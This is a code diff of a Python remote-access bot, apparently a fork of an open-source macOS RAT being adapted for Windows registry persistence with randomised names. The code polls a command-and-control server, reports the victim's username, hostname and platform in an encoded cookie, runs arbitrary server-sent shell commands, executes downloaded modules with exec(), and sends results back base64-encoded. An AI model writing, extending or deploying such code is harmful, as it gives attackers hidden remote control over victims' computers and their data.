@@ -1,8 +1,3 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-"""Minimal bot which loads modules as they are needed from the server."""
-__author__ = "Marten4n6"
-__license__ = "GPLv3"
 __version__ = "4.1.1"
 
 import getpass
@@ -10,28 +5,30 @@ import json
 import logging
 import os
 import subprocess
-from threading import Timer, Thread
+# import multiprocessing
+import sys
+import binascii
 import traceback
 import uuid
+import platform
+from threading import Timer,Thread
 from base64 import b64encode, b64decode
 from binascii import hexlify
 from time import sleep, time
 from zlib import decompress
-import platform
-from io import StringIO
+# from io import StringIO
 from urllib.parse import urlencode
-import sys
-import binascii
+
 
 import urllib.request
 import urllib.error
 # *************************************************************
 # These variables will be patched when this payload is created.
 SERVER_HOST = "127.0.0.1"
-SERVER_PORT = 1337
+#SERVER_PORT = 5000
 USER_AGENT = ""
-PROGRAM_DIRECTORY = ""
-LOADER_OPTIONS = {"loader_name": "launch_daemon"}
+PROGRAM_DIRECTORY = os.path.expanduser("")
+LOADER_OPTIONS = {'loader_name': 'windows_reg', 'launch_agent_name': 'GDSBZUkIjuiIAPO', 'payload_filename': 'PICKaPWuATvjRYH', 'program_directory': ''}
 # *************************************************************
 
 COMMAND_INTERVAL = 1  # Normal interval to check for commands.
@@ -85,13 +82,12 @@ def get_uid():
     # See https://docs.python.org/2/library/uuid.html#uuid.getnode
     return hexlify((getpass.getuser() + "-" + str(uuid.getnode()) + "-" + __version__).encode())
 
-
 def run_command(command, cleanup=True, kill_on_timeout=True):
     """Runs a system command and returns its response."""
-    if len(command) > 3 and command[0:3] == "cd ":                              #if command is greater than 3 and startswith cd then
-        try:                                                                    #change directory to command by removing cd from the main command
+    if len(command) > 3 and command[0:3] == "cd ":
+        try:
             os.chdir(os.path.expanduser(command[3:]))
-            return "Directory changed to: " + os.getcwd()                       # return Directory changed to path
+            return "Directory changed to: " + os.getcwd()
         except Exception as ex:
             log.error(str(ex))
             return str(ex)
@@ -99,17 +95,20 @@ def run_command(command, cleanup=True, kill_on_timeout=True):
         try:
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             timer = None
+            
 
             try:
+                
                 if kill_on_timeout:
                     # Kill process after 5 seconds (in case it hangs).
                     timer = Timer(5, lambda process: process.kill(), [process])
                     timer.start()
 
                 stdout, stderr = process.communicate()
-                response = (stdout + stderr).decode()                          #Response is in string
+                response = (stdout + stderr).decode()
 
                 if cleanup:
+                    #print(type(response))
                     return response.replace("\n", "")
                 else:
                     if len(response.split("\n")) == 2:  # Response is one line.
@@ -120,7 +119,8 @@ def run_command(command, cleanup=True, kill_on_timeout=True):
                 if timer:
                     timer.cancel()
         except Exception as ex:
-            log.error(str(ex))
+            #log.error(str(ex))
+            print("error is here")
             return str(ex)
 
 
@@ -144,8 +144,10 @@ class ModuleTask(Thread):
 
             if "response_options" in self._command.options:
                 response_options = self._command.options["response_options"]
-
+            
+            log.debug("Sending Response")
             send_response(text, module_name, response_options)
+            
 
     def run(self):
         sys.stdout = self
@@ -161,12 +163,13 @@ class ModuleTask(Thread):
 
         # We want every module to be able to access these options.
         self._command.options["server_host"] = SERVER_HOST
-        self._command.options["server_port"] = SERVER_PORT
+        self._command.options["server_port"] = ""
         self._command.options["program_directory"] = PROGRAM_DIRECTORY
         self._command.options["loader_options"] = LOADER_OPTIONS
 
         try:
             exec(module, module_dict)
+            # log.debug('STUCK IN LOOP')
             module_dict["run"](self._command.options)  # Thanks http://lucumr.pocoo.org/2011/2/1/exec-in-python/
         except Exception:
             send_response("Error executing module: \n" + traceback.format_exc())
@@ -175,6 +178,7 @@ class ModuleTask(Thread):
 
     def global_trace(self, frame, why, arg):
         if why == "call":
+            sleep(0.001)
             return self.local_trace
         else:
             return None
@@ -189,6 +193,12 @@ class ModuleTask(Thread):
         self._is_killed = True
 
 
+
+
+
+
+
+
 def send_response(response, module_name="", response_options=""):
     """Sends a response to the server.
 
@@ -197,13 +207,11 @@ def send_response(response, module_name="", response_options=""):
     :type response_options: dict
     """
     headers = {"User-Agent": USER_AGENT}
+    #print(type(get_uid()))
     data = urlencode({"username": b64encode((json.dumps({"response": b64encode(response.encode()).decode(),"bot_uid": get_uid().decode(), "module_name": module_name, "response_options": response_options})).encode())}).encode()
-    #data = {
-    # "username": b64encode((json.dumps({
-    # "response": b64encode(response.encode()).decode(),
-    # "bot_uid": getuid.decode()})).encode())}).encode()
+    #print({"response": b64encode(response.encode()).decode(),"bot_uid": get_uid().decode(), "module_name": module_name, "response_options": response_options})
     try:
-        request = urllib.request.Request("http://%s:%s" % (SERVER_HOST, SERVER_PORT), headers=headers, data=data)
+        request = urllib.request.Request(f"{SERVER_HOST}/get_responses", headers=headers, data=data)
         urllib.request.urlopen(request)
     except urllib.error.HTTPError as ex:
         if ex.code == 404:
@@ -223,8 +231,8 @@ def get_command():
         "Cookie": "session=" + b64encode(get_uid()).decode()+ "-" +
                   b64encode((json.dumps({
                       "type": RequestType.GET_COMMAND, "username": run_command("whoami"),
-                      "hostname": run_command("hostname"), "path": run_command("pwd"),
-                      "version": str(platform.mac_ver()[0]), "loader_name": LOADER_OPTIONS["loader_name"]
+                      "hostname": run_command("hostname"), "path": os.getcwd(),
+                      "version": str(platform.platform()), "loader_name": LOADER_OPTIONS["loader_name"]
         })).encode()).decode()
     }
     #print(headers["Cookie"])
@@ -232,19 +240,19 @@ def get_command():
 
     try:
         # This will always throw an exception because the server will respond with 404.
-        urllib.request.urlopen(urllib.request.Request("http://%s:%s" % (SERVER_HOST, SERVER_PORT), headers=headers))
+        urllib.request.urlopen(urllib.request.Request(f"{SERVER_HOST}/sendcommand", headers=headers))
     except urllib.error.HTTPError as ex:
         if ex.code == 404:
             response = ex.read().decode()
 
-            log.debug("Raw response: \n" + response)
+            log.debug("Raw response: \n")
         else:
             log.error(ex.message)
 
     try:
         processed = response.split("DEBUG:\n")[1].replace("DEBUG-->", "")
         try:
-            print(type(processed.encode()))
+            #print(type(processed.encode()))
             processed_split = b64decode(processed.encode()).decode().split("\n")
         except binascii.Error:
             return Command(CommandType.NONE)
@@ -287,13 +295,16 @@ def main():
 
                 if command.type == CommandType.MODULE:
                     log.debug("Running module...")
+    
 
                     module_task = ModuleTask(command)
                     module_task.daemon = True
                     module_task.start()
                 else:
+
                     log.debug("Running command...")
-                    send_response(run_command(b64decode(command.command), cleanup=False))
+                    #print("result: ",run_command(b64decode(command.command).decode(), cleanup=False))
+                    send_response(run_command(b64decode(command.command).decode(), cleanup=False))
             else:
                 log.info("No command received.")
 
